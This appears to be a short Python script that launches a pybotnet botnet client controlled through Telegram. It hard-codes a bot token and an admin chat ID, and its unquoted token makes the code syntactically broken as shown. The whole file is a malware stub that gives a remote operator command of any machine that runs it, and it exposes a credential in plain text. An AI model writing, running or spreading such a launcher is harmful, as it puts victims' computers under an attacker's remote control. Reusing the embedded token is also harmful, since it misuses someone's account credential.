from pybotnet import BotNet, TelegramEngine


telegram_engine = TelegramEngine(token=5428867295:AAFrGpuNJ9g-YqBWMBpV1kV1fOqF9ZscI6M, admin_chat_id=1565592493) #

botnet = BotNet(telegram_engine) # 
botnet.run()
